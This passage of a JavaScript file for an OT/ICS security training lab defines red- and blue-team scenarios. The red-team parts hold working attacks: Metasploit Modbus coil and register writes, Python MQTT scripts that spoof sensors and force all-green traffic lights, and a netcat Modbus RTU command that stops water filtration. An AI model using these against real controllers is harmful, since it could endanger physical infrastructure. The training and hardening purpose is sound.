      "Detect: review mailbox indicators, attachment metadata, endpoint alerts, and unexpected changes to the approved test file.",
      "Contain: isolate the affected training workstation, block the sender/attachment hash, and stop the simulator process.",
      "Recover: restore the approved test file using the saved classroom recovery key and verify file integrity.",
      "Investigate billboard risk: review FTP logs, upload evidence, media workflow execution context, and approved content state.",
      "Recover billboard content: remove benign test media and restore approved video files.",
      "Harden: enable phishing controls, attachment sandboxing, least privilege, offline backups, FTP authentication, media validation, and monitoring for suspicious upload/process activity."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
MAIL AND ENDPOINT TRIAGE
==============================
Review:
  Sender address and subject
  Attachment filename and hash
  Download/execution timestamp
  Endpoint alerts
  File-change evidence for /home/alpha/Documents/secret.dat

Contain:
  Isolate the affected training workstation
  Block the attachment hash or file pattern
  Stop the simulator process


==============================
RANSOMWARE SIMULATION RECOVERY
==============================
Use the saved classroom recovery key/IV.
Restore only the approved test file.
Validate file content and hash after recovery.
Document recovery time and data-loss impact.


==============================
BILLBOARD INCIDENT REVIEW
==============================
Review:
  FTP authentication and upload logs
  Uploaded filenames
  Media-processing script behavior
  Approved content directory state

Contain:
  Disable anonymous FTP if enabled
  Remove benign test uploads
  Restore approved billboard content


==============================
HARDENING CHECKLIST
==============================
Enable mail filtering, attachment sandboxing, and user reporting.
Block risky attachment types and suspicious archive/script patterns.
Maintain offline backups and tested restore procedures.
Restrict FTP access and disable anonymous uploads.
Validate uploaded media type and location.
Run media processors with least privilege.
Alert on unexpected file encryption, upload spikes, and media replacement events.`,
    links: []
  }
};

const metroScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Metro Modbus Coil Attack Surface",
    summary: "Students investigate an authorized lab-only Metro PLC where Modbus TCP on port 502 exposes coil write behavior. The drill shows how ladder-logic interlocks may block normal tampering, while direct coil writes still require strict control and monitoring.",
    badges: ["Modbus TCP", "PLC 172.16.17.127", "Port 502", "Write Coil"],
    steps: [
      "Open the Metro dashboard and observe normal train, signal, and interlocking behavior.",
      "Scan the approved Metro PLC target to confirm Modbus TCP is exposed on port 502.",
      "Attempt normal Modbus interaction and observe that the interlocking/ladder logic prevents unsafe tampering.",
      "Use the approved Metasploit Modbus client to test a controlled direct coil write in the lab.",
      "Observe the dashboard and physical model for train/signal effect.",
      "Restore the Metro model to the approved safe state before ending the drill."
    ],
    actionTitle: "Metro Lab Commands",
    commands: `==============================
ENUMERATION
==============================
PLC:
  172.16.17.127

Protocol:
  Modbus Application Protocol over TCP

Port:
  502

Scan:
  nmap -p 502 172.16.17.127

Student task:
  Confirm TCP/502 is open before testing Modbus behavior.


==============================
INTERLOCK OBSERVATION
==============================
Goal:
  Try the approved Modbus interaction and observe that the interlocking mechanism / ladder logic does not allow normal unsafe tampering.

Student task:
  Record what the dashboard and physical model do when the interlock blocks unsafe behavior.


==============================
CONTROLLED COIL WRITE TEST
==============================
Start Metasploit:
  msfconsole

Use the Modbus client:
  use auxiliary/scanner/scada/modbusclient
  set rhosts 172.16.17.127
  set action write_coil
  set data_address 0
  set data 1
  run

Student task:
  Observe the effect on the Metro dashboard and physical model.
  Record timestamp, coil address, written value, and visible impact.


==============================
RESTORE SAFE STATE
==============================
Stop the Modbus client session.
Use the approved operator workflow to restore normal Metro state.
Confirm train/signal/interlock status returns to normal.

Safety note:
  Run only on the approved lab PLC and only during the supervised Metro drill.`,
    links: [
      { label: "Open Metro Dashboard", href: metroDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Metro Modbus Coil Defense And Response",
    summary: "Students defend the Metro model by detecting unauthorized Modbus coil writes, validating interlock behavior, restoring safe train/signal state, and hardening PLC access.",
    badges: ["Detect TCP/502", "Contain Modbus", "Restore Interlock", "Harden PLC"],
    steps: [
      "Detect: monitor Metro dashboard for unexpected train, signal, or interlock state changes.",
      "Confirm: correlate dashboard events with Modbus TCP/502 traffic and write_coil activity.",
      "Contain: stop the unauthorized Modbus client and isolate the suspected attacker host.",
      "Recover: restore the Metro model through the approved operator workflow.",
      "Validate: confirm train movement, signal state, and interlocking behavior remain stable.",
      "Harden: restrict TCP/502 to trusted HMI/SCADA hosts, segment the PLC network, monitor write_coil operations, and document allowed coil/register access."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
DETECT AND CONFIRM
==============================
Check the Metro dashboard for:
  Unexpected train movement
  Signal state changes
  Interlock state changes
  Dashboard events without operator action

Review network evidence for:
  TCP/502 access
  Modbus write_coil operations
  Unknown engineering hosts


==============================
CONTAIN
==============================
Stop the suspicious Modbus client session.
Isolate the suspected Kali or engineering host.
Block unapproved TCP/502 access to the Metro PLC.
Preserve packet captures and dashboard timeline evidence.


==============================
RESTORE METRO STATE
==============================
Use the approved operator workflow to restore normal train/signal/interlock state.
Compare dashboard state with the physical Metro model.
Confirm no repeated coil write events continue.


==============================
HARDENING CHECKLIST
==============================
Restrict TCP/502 to trusted HMI/SCADA hosts only.
Segment Metro PLCs from student networks.
Monitor and alert on write_coil actions.
Document approved coil/register addresses.
Maintain an interlock recovery SOP.
Validate ladder-logic protections after any PLC change.`,
    links: [
      { label: "Open Metro Dashboard", href: metroDashboardUrl }
    ]
  }
};

const trafficLightsScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Traffic Lights MQTT Attack Surface",
    summary: "Students investigate an authorized lab-only Traffic Lights model where exposed MQTT on port 1883 allows topic discovery and false green-light publishing that can create an unsafe all-green intersection state.",
    badges: ["MQTT", "Broker 172.16.17.208", "Port 1883", "Traffic Lights"],
    steps: [
      "Open the Traffic Lights dashboard and observe normal manual control behavior.",
      "Scan the approved MQTT broker target to confirm port 1883 is reachable.",
      "Subscribe with the MQTT wildcard topic to discover signal-control topics while someone manually controls the lights.",
      "Map topic names such as t1/control/r, t1/control/y, and t1/control/g with their observed values.",
      "Run the approved lab script to publish green state to all green topics and observe the unsafe all-green condition.",
      "Stop the script and restore the traffic lights to a safe dashboard-controlled state."
    ],
    actionTitle: "Traffic Lights Lab Commands",
    commands: `==============================
ENUMERATION
==============================
MQTT broker:
  172.16.17.208

Protocol:
  MQTT

Port:
  1883

Scan:
  nmap -p 1883 172.16.17.208

Student task:
  Confirm MQTT is reachable before subscribing or publishing.


==============================
TOPIC DISCOVERY
==============================
Subscribe to all visible topics:
  mosquitto_sub -h 172.16.17.208 -t '#' -p 1883 -v

Ask someone to control the traffic lights manually from the dashboard.

Expected topic examples:
  t1/control/r
  t1/control/y
  t1/control/g
  t2/control/g

Student task:
  Record topic names, values, and which physical light changed.


==============================
ALL-GREEN SIMULATION
==============================
Sample approved lab script:

import paho.mqtt.client as mqtt
import time

broker = "172.16.17.208"
port = 1883
green_topics = ["t1/control/g", "t2/control/g", "t3/control/g", "t4/control/g"]

client = mqtt.Client()
try:
    client.connect(broker, port)
    while True:
        for topic in green_topics:
            client.publish(topic, "1")
        time.sleep(0.2)
except KeyboardInterrupt:
    print("Program interrupted by user. Exiting...")
finally:
    client.disconnect()

Student task:
  Observe the model and dashboard for an all-green unsafe condition.


==============================
RESTORE SAFE STATE
==============================
Stop the script with Ctrl+C.
Use the dashboard/manual controls to restore safe traffic-light state.
Confirm only valid signal combinations remain active.

Safety note:
  Run only on the approved lab broker and restore safe signal state immediately after observation.`,
    links: [
      { label: "Open Traffic Lights Dashboard", href: trafficLightsDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Traffic Lights MQTT Defense And Response",
    summary: "Students defend the Traffic Lights model by detecting unauthorized MQTT publishers, impossible all-green signal states, dashboard/manual mismatch, and weak topic access controls.",
    badges: ["Detect MQTT", "Contain Publisher", "Restore Signals", "Harden Topics"],
    steps: [
      "Detect: monitor the dashboard for all-green conditions, rapid signal changes, or state changes without operator action.",
      "Confirm: correlate light changes with MQTT broker activity, topic names, publisher host, and timestamps.",
      "Contain: stop the unauthorized MQTT publisher and isolate the suspicious Kali host.",
      "Recover: restore safe signal state using dashboard/manual controls.",
      "Validate: confirm all traffic-light phases return to safe combinations and remain stable.",
      "Harden: require MQTT authentication, disable anonymous publish, apply topic ACLs, restrict port 1883, validate signal logic, and alert on impossible all-green states."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
DETECT AND CONFIRM
==============================
Check the Traffic Lights dashboard for:
  All green lights active together
  Rapid state changes
  Signal changes without operator action
  Manual control mismatch

Review MQTT evidence for:
  Publisher host
  Topic names
  Payload values
  Timestamp of abnormal publishes


==============================
CONTAIN
==============================
Stop the suspicious MQTT publisher script.
Isolate the suspected Kali host.
Block unapproved access to TCP/1883.
Preserve dashboard and broker evidence.


==============================
RESTORE SAFE SIGNAL STATE
==============================
Use dashboard/manual controls to reset signals.
Confirm only safe traffic-light combinations are active.
Observe the model for several cycles.


==============================
HARDENING CHECKLIST
==============================
Enable MQTT username/password.
Disable anonymous publish.
Apply topic ACLs so clients cannot publish to all signal topics.
Restrict TCP/1883 to trusted controller hosts.
Add signal-logic validation to reject all-green states.
Alert on wildcard topic discovery and repeated green-topic publishes.`,
    links: [
      { label: "Open Traffic Lights Dashboard", href: trafficLightsDashboardUrl }
    ]
  }
};

const scriptCode = {
  single: `import paho.mqtt.client as mqtt
import time

# MQTT broker details
broker_address = "172.16.17.207"
topic = "ZPHS01B/NO2"

client = mqtt.Client()
client.connect(broker_address)

try:
    while True:
        client.publish(topic, "100")
        print(f"Data '100' sent to topic {topic}")
        time.sleep(0.1)
except KeyboardInterrupt:
    print("Process interrupted")
finally:
    client.disconnect()`,
  all: `import paho.mqtt.client as mqtt
import time

broker_address = "172.16.17.207"
attack_value = "999"
scan_duration = 10
attack_delay = 0.02

seen_topics = set()

def on_message(client, userdata, message):
    topic = message.topic
    if topic not in seen_topics:
        print(f"[SCAN] Found topic: {topic}")
        seen_topics.add(topic)

scan_client = mqtt.Client()
scan_client.on_message = on_message
scan_client.connect(broker_address)
scan_client.subscribe("#")
scan_client.loop_start()

print(f"[*] Scanning for attack surfaces for {scan_duration} seconds...")
time.sleep(scan_duration)
scan_client.loop_stop()
scan_client.disconnect()

print(f"[+] Found {len(seen_topics)} topics: {seen_topics}")

attack_client = mqtt.Client()
attack_client.connect(broker_address)

try:
    print("[!] Launching MQTT spoofing simulation...")
    while True:
        for topic in seen_topics:
            attack_client.publish(topic, attack_value)
            print(f"[SIM] Sent fake value '{attack_value}' to topic '{topic}'")
            time.sleep(attack_delay)
except KeyboardInterrupt:
    print("\\n[!] Simulation stopped by user.")
finally:
    attack_client.disconnect()`
};

const industryScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Industrial Attack Surface Training",
    summary: "Students simulate a lab-only MQTT sensor spoofing incident from a Kali machine and observe fake industrial values appearing live in the Industrial dashboard.",
    badges: ["Kali machine", "MQTT broker 172.16.17.207", "Node-RED dashboard"],
    steps: [
      "Connect Kali to the Phygital Lab network.",
      "Open the Industrial dashboard and keep it visible during the simulation.",
      "Run single.py first to spoof only the NO2 topic and watch one gauge change.",
      "Run all.py to scan visible MQTT topics and publish fake values to all discovered topics.",
      "Stop the script with Ctrl+C and record which values changed."
    ],
    commands: `==============================
SETUP
==============================
Move to the student script folder:
  cd /home/kali/documents

Install the MQTT dependency if needed:
  python3 -m pip install paho-mqtt


==============================
SINGLE-SENSOR SIMULATION
==============================
Run the one-topic simulation:
  python3 single.py

Student task:
  Watch the dashboard and record which single gauge changes.


==============================
MULTI-SENSOR SIMULATION
==============================
Run the all-topic simulation:
  python3 all.py

Student task:
  Record discovered topics, fake values, affected gauges, and dashboard behavior.


==============================
CLEANUP
==============================
Stop the script:
  Ctrl+C

Confirm dashboard values return to normal before ending the drill.`,
    links: [
      { label: "Open Industrial Dashboard", href: industryDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Industrial Mitigation And Response",
    summary: "Students defend the Industrial model by detecting MQTT spoofing, stopping the simulation safely, restoring trusted values, and documenting hardening steps.",
    badges: ["Detect", "Contain", "Recover", "Harden"],
    steps: [
      "Detect: open the Industrial dashboard and identify impossible or sudden values such as NO2, CO2, VOC, gas, or humidity spikes.",
      "Confirm: compare dashboard readings with the physical model and normal operating range to confirm the values are fake.",
      "Contain: ask the Red Team/Kali operator to stop the running script with Ctrl+C. If the attacker machine is unknown, isolate the suspected Kali host from the lab network.",
      "Recover: wait for real sensor values to return, then refresh the dashboard and confirm gauges are stable.",
      "Document: record affected MQTT topics, fake values, time observed, suspected source IP, and recovery action.",
      "Harden: recommend MQTT authentication, disable anonymous publish, apply topic ACLs, restrict port 1883, segment the Industrial network, and add alert thresholds in Node-RED."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
STOP THE ATTACK SCRIPT
==============================
   Press Ctrl+C in the terminal running single.py or all.py

==============================
ISOLATE UNKNOWN SOURCE
==============================
   Disconnect/isolate the suspicious Kali machine from the lab network

==============================
VALIDATE RECOVERY
==============================
   Refresh the Industrial dashboard
   Confirm sensor values return to normal

==============================
HARDENING CHECKLIST
==============================
   Enable MQTT username/password
   Disable anonymous publish
   Add topic ACLs
   Restrict broker port 1883 to trusted hosts
   Add Node-RED alerts for impossible values`,
    links: [
      { label: "Open Industrial Dashboard", href: industryDashboardUrl }
    ]
  }
};

const dataCenterScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Data Center HVAC Modbus Attack Surface",
    summary: "Students simulate a lab-only Modbus TCP attack path against the Data Center HVAC PLC and observe how coolant and ventilation control changes affect the dashboard.",
    badges: ["Modbus TCP", "PLC 172.16.17.126", "Port 502", "HVAC"],
    steps: [
      "Connect Kali to the Phygital Lab network and open the Data Center HVAC dashboard.",
      "Scan the PLC to confirm Modbus TCP is exposed on port 502.",
      "Use Metasploit's Modbus client scanner to read register values while someone controls the HVAC coolant from the dashboard.",
      "Identify the register mapping: data_address 0 controls coolant and data_address 1 controls the ventilation fan.",
      "Write the captured lab values to control coolant state and observe dashboard impact.",
      "Restore the coolant to the safe ON state before ending the drill."
    ],
    actionTitle: "Modbus Lab Commands",
    commands: `==============================
ENUMERATION
==============================
Confirm Modbus TCP exposure:
  nmap -p 502 172.16.17.126

Student task:
  Verify TCP/502 is open before using a Modbus client.


==============================
REGISTER DISCOVERY
==============================
Start Metasploit:
  msfconsole

Use the Modbus client:
  use auxiliary/scanner/scada/modbusclient
  set rhosts 172.16.17.126
  set data_address 1
  run

Student task:
  Ask someone to operate HVAC controls and capture register values.


==============================
COOLANT WRITE TEST
==============================
Coolant register discovered during the lab:
  set data_address 0
  set action write_register
  set data 333
  run

Student task:
  Observe coolant state change on the dashboard and physical model.


==============================
RESTORE SAFE STATE
==============================
Restore coolant ON:
  set data 111
  run

Safety note:
  Restore coolant to the safe ON state before ending the drill.`,
    links: [
      { label: "Open Data Center Dashboard", href: dataCenterDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Data Center HVAC Mitigation And Response",
    summary: "Students defend the Data Center model by detecting unauthorized Modbus writes, restoring HVAC coolant, and recommending protections for the PLC network.",
    badges: ["Detect", "Contain", "Restore Cooling", "Harden Modbus"],
    steps: [
      "Detect: watch the Data Center dashboard for coolant OFF state, ventilation changes, or abnormal temperature rise.",
      "Confirm: compare dashboard state with physical model behavior and expected HVAC control commands.",
      "Contain: stop the unauthorized Modbus client session and isolate the attacking Kali host from the PLC network.",
      "Recover: restore coolant ON using the approved dashboard control or authorized recovery command.",
      "Validate: confirm coolant returns to ON and temperature stabilizes on the dashboard.",
      "Harden: restrict port 502, allow only trusted HMI/SCADA hosts, segment the PLC VLAN, alert on Modbus write_register operations, and document register access."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
STOP UNAUTHORIZED ACTIVITY
==============================
   Close the Modbus client session
   Isolate the suspicious Kali host from the PLC network

==============================
RESTORE SAFE HVAC STATE
==============================
   Turn coolant ON from the approved dashboard
   Confirm data_address 0 returns to the safe coolant state

==============================
VALIDATE RECOVERY
==============================
   Watch the Data Center dashboard
   Confirm coolant is ON and temperature stabilizes

==============================
HARDENING CHECKLIST
==============================
   Restrict TCP/502 to trusted HMI or SCADA hosts
   Segment PLC and student networks
   Alert on Modbus write_register actions
   Document allowed register addresses
   Keep a manual HVAC recovery SOP`,
    links: [
      { label: "Open Data Center Dashboard", href: dataCenterDashboardUrl }
    ]
  }
};

const waterTreatmentScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Water Treatment Moxa Modbus RTU Attack Surface",
    summary: "Students simulate an authorized lab-only Modbus RTU-over-TCP command injection path against the Water Treatment model and observe filtration or recycle pump behavior on the dashboard.",
    badges: ["Moxa NPort", "Modbus RTU over TCP", "Port 4001", "Water Treatment"],
    steps: [
      "Open the Water Treatment dashboard and use the approved dashboard controls to start the physical model.",
      "Identify the Moxa NPort device in the Water Treatment network and confirm the approved lab target IP.",
      "Confirm that TCP port 4001 is reachable on the Moxa device.",
      "Use the approved Modbus RTU HEX command generated for the lab to send a command through netcat.",
      "Observe the dashboard and physical model for filter or pump state changes.",
      "Restore the model using the approved dashboard controls before ending the drill."
    ],
    actionTitle: "Moxa Lab Commands",
    commands: `==============================
ENUMERATION
==============================
Approved lab target:
  MOXA_IP=172.16.17.133
  MOXA_PORT=4001

Confirm the Moxa serial gateway port is reachable:
  nmap -p 4001 $MOXA_IP

Student task:
  Identify the Moxa gateway and confirm the Modbus RTU-over-TCP path.


==============================
COMMAND INJECTION SIMULATION
==============================
Lab example: generated Modbus RTU command used to stop filtration:
  python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('01100000000102014D67F5'))" | nc $MOXA_IP $MOXA_PORT

Student task:
  Observe filtration or pump behavior on the dashboard and physical model.


==============================
RESTORE SAFE STATE
==============================
Use the approved dashboard controls to restart filtration and pump operation.

Safety note:
  Run only approved HEX commands for this lab and restore the model from the dashboard after testing.`,
    links: [
      { label: "Open Water Treatment Dashboard", href: waterTreatmentDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Water Treatment Mitigation And Response",
    summary: "Students defend the Water Treatment model by detecting unauthorized commands through the Moxa gateway, restoring filtration and recycle pump operation, and documenting OT hardening steps.",
    badges: ["Detect", "Contain Moxa Access", "Restore Pumps", "Harden OT"],
    steps: [
      "Detect: monitor the Water Treatment dashboard for unexpected filtration stop or recycle pump changes.",
      "Confirm: compare dashboard state with the physical model and expected operator actions.",
      "Contain: stop the unauthorized netcat/Python session and isolate the attacking Kali host from the Water Treatment network.",
      "Recover: use the approved dashboard controls to restart filtration and pump operation.",
      "Validate: confirm filtration and recycle pump state are stable on the dashboard and physical model.",
      "Harden: restrict TCP/4001 to trusted engineering/HMI hosts, segment the Moxa gateway, log serial gateway connections, alert on unauthorized write commands, and document approved Modbus command use."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
STOP UNAUTHORIZED ACTIVITY
==============================
   Close the Python/netcat command session
   Isolate the suspicious Kali host from the Water Treatment network

==============================
RESTORE SAFE PLANT OPERATION
==============================
   Open the Water Treatment dashboard
   Restart filtration and recycle pump using approved controls

==============================
VALIDATE RECOVERY
==============================
   Confirm dashboard state matches the physical model
   Check that filtration and pump indicators stay stable

==============================
HARDENING CHECKLIST
==============================
   Restrict TCP/4001 to trusted HMI or engineering hosts
   Segment the Moxa serial gateway from student networks
   Log and alert on Moxa gateway sessions
   Alert on unauthorized Modbus RTU write commands
   Maintain an approved command/register inventory`,
    links: [
      { label: "Open Water Treatment Dashboard", href: waterTreatmentDashboardUrl }
    ]
  }
};

function getScenario(domain, mode) {
  if (domain === "lift-house") return liftHouseScenarios[mode] || liftHouseScenarios.red;
  if (domain === "hospital") return hospitalScenarios[mode] || hospitalScenarios.red;
  if (domain === "airport") return airportScenarios[mode] || airportScenarios.red;
  if (domain === "power-grid") return powerGridScenarios[mode] || powerGridScenarios.red;
  if (domain === "toll-plaza") return tollPlazaScenarios[mode] || tollPlazaScenarios.red;
  if (domain === "stock-market") return stockMarketScenarios[mode] || stockMarketScenarios.red;
  if (domain === "metro") return metroScenarios[mode] || metroScenarios.red;
  if (domain === "traffic-lights") return trafficLightsScenarios[mode] || trafficLightsScenarios.red;
  if (domain === "water-treatment") return waterTreatmentScenarios[mode] || waterTreatmentScenarios.red;
  if (domain === "industry") return industryScenarios[mode] || industryScenarios.red;
  if (domain === "data-center") return dataCenterScenarios[mode] || dataCenterScenarios.red;
  const title = domainTitles[domain] || "Model";
  const isRed = mode === "red";
  return {
    kicker: isRed ? "Red Team Scenario" : "Blue Team Scenario",
    title: isRed ? `${title} Attack Surface Training` : `${title} Monitoring And Response`,
    summary: "This page is ready for a model-specific lab scenario. Add the script, dashboard link, and student instructions for this model when available.",
    badges: isRed ? ["Lab scenario", "CTF-ready", "Student drill"] : ["Monitoring", "Evidence", "Response"],
    steps: isRed
      ? [
        "Review the model overview and identify approved lab targets.",
        "Run only the authorized training script for this model.",
        "Observe the model dashboard and capture evidence.",
        "Stop the simulation and hand findings to the Blue Team."
      ]
      : [
        "Monitor the model dashboard for abnormal behavior.",
        "Compare dashboard signals with physical model state.",
        "Record affected devices, values, and time.",
        "Recommend controls and recovery steps."
      ],
    actionTitle: isRed ? "Scenario Status" : "Mitigation Status",
    commands: isRed ? "No Python script has been added for this model yet." : "No model-specific mitigation playbook has been added yet.",
    links: []
  };
}

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (char) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  }[char]));
}

function parseCommandSections(commandText) {
  const lines = String(commandText || "").split(/\r?\n/);
  const sections = [];
  let current = { title: "", body: [] };
  let usedDividerSections = false;

  for (let index = 0; index < lines.length; index += 1) {
    const line = lines[index].trim();
    const next = lines[index + 1]?.trim();
    const isDivider = /^={6,}$/.test(line);

    if (isDivider && next && /^={6,}$/.test(lines[index + 2]?.trim() || "")) {
      if (current.title || current.body.some(Boolean)) sections.push(current);
      current = { title: next, body: [] };
      usedDividerSections = true;
      index += 2;
      continue;
    }

    current.body.push(lines[index]);
  }

  if (current.title || current.body.some(Boolean)) sections.push(current);
  if (usedDividerSections) return sections;

  const numberedSections = [];
  let numberedCurrent = null;
  for (const rawLine of lines) {
    const match = rawLine.match(/^(\d+\.\s+.+):?\s*$/);
    if (match) {
      if (numberedCurrent) numberedSections.push(numberedCurrent);
      numberedCurrent = { title: match[1].replace(/:$/, ""), body: [] };
      continue;
    }
    if (numberedCurrent) {
      numberedCurrent.body.push(rawLine);
    }
  }
  if (numberedCurrent) numberedSections.push(numberedCurrent);
  if (numberedSections.length > 1) return numberedSections;

  return sections.length ? sections : [{ title: "", body: lines }];
}

function renderCommands(commandText) {
  const container = document.getElementById("scenario-commands");
  const sections = parseCommandSections(commandText);
  container.innerHTML = sections.map((section) => {
    const body = section.body.join("\n").trim();
    const title = section.title.trim();
    return `
      <div class="scenario-command-section">
        ${title ? `<h3>${escapeHtml(title)}</h3>` : ""}
        <pre>${escapeHtml(body)}</pre>
      </div>`;
  }).join("");
}

function renderScenario() {
  const params = new URLSearchParams(window.location.search);
  const domain = params.get("domain") || "industry";
  const mode = params.get("mode") || "red";
  const showPythonCode = false;
  const scenario = getScenario(domain, mode);
  const { isStudent } = currentRole();

  document.title = `${scenario.title} - Phygital Lab`;
  if (isStudent) {
    document.querySelector(".scenario-hero")?.remove();
    document.querySelector(".scenario-grid")?.remove();
    document.getElementById("scenario-code-section")?.remove();
    renderEmbeddedCtf(domain, mode);
    applyScenarioAccessState();
    return;
  }

  document.getElementById("scenario-kicker").textContent = scenario.kicker;
  document.getElementById("scenario-title").textContent = scenario.title;
  document.getElementById("scenario-summary").textContent = scenario.summary;
  document.getElementById("scenario-badges").innerHTML = scenario.badges.map((badge) => `<span>${badge}</span>`).join("");
  document.getElementById("scenario-steps").innerHTML = scenario.steps.map((step) => `<li>${step}</li>`).join("");
  document.getElementById("scenario-action-title").textContent = scenario.actionTitle || "Kali Commands";
  renderCommands(scenario.commands);
  document.getElementById("scenario-command-note").hidden = true;
  document.getElementById("scenario-code-section").hidden = !showPythonCode;
  document.getElementById("scenario-links").innerHTML = scenario.links.map((link) => (
    `<button class="scenario-dashboard-btn" type="button" data-href="${link.href}">${link.label}</button>`
  )).join("");
  document.getElementById("scenario-code-section").hidden = true;
  renderEmbeddedCtf(domain, mode);
  applyScenarioAccessState();
}

function renderEmbeddedCtf(domain, mode) {
  const section = document.getElementById("scenario-ctf-section");
  const board = document.getElementById("scenario-ctf-board");
  if (!section || !board) return;
  const { isStudent } = currentRole();

  const showRoom = isStudent;
  section.hidden = !showRoom;
  if (!showRoom) {
    board.innerHTML = "";
    return;
  }

  if (!window.CTF || typeof CTF.renderBoard !== "function") {
    board.innerHTML = '<div class="ctf-empty"><p>CTF board is not available.</p></div>';
    return;
  }
  const title = document.getElementById("scenario-ctf-title");
  const link = document.getElementById("scenario-ctf-link");
  if (title) title.textContent = `${domainTitles[domain] || "Model"} Tasks And Leaderboard`;
  if (link) {
    link.textContent = "Open Overall Leaderboard";
    link.href = "#overall-leaderboard";
    link.onclick = (event) => {
      event.preventDefault();
      if (window.CTF && typeof CTF.openOverallLeaderboardModal === "function") {
        CTF.openOverallLeaderboardModal();
      }
    };
  }
  CTF.renderBoard(domain, "scenario-ctf-board");
}

function applyScenarioAccessState() {
  const { role, isAdmin, isStudent } = currentRole();
  if (role === "student") localStorage.removeItem("phygital_admin_token");
  const signedIn = isAdmin || isStudent;
  document.querySelectorAll("[data-admin-link]").forEach((link) => {
    link.hidden = !isAdmin;
  });
  document.querySelectorAll("[data-auth-action]").forEach((link) => {
    link.textContent = signedIn ? "Logout" : "Login";
    link.href = signedIn ? "#" : "/login.html";
    link.onclick = signedIn ? (event) => {
      event.preventDefault();
      localStorage.removeItem("phygital_admin_token");
      localStorage.removeItem("cdac_ctf_student");
      localStorage.removeItem("phygital_role");
      window.location.href = "/login.html";
    } : null;
  });
}

function hasScenarioAccess() {
  const role = localStorage.getItem("phygital_role") || "";
  const hasAdminToken = Boolean(localStorage.getItem("phygital_admin_token"));
  const hasStudent = Boolean(localStorage.getItem("cdac_ctf_student"));
  return (role === "admin" && hasAdminToken) || (role === "student" && hasStudent);
}

document.addEventListener("DOMContentLoaded", () => {
  if (!hasScenarioAccess()) {
    window.location.replace("/login.html");
    return;
  }
  renderScenario();
  document.querySelectorAll("[data-code-target]").forEach((button) => {
    button.addEventListener("click", () => {
      const target = button.dataset.codeTarget;
      document.getElementById("scenario-code-view").textContent = scriptCode[target] || "Code not available.";
    });
  });
  document.getElementById("scenario-links").addEventListener("click", (event) => {
    const button = event.target.closest("[data-href]");
    if (!button) return;
    window.open(button.dataset.href, "_blank", "noopener");
  });
});
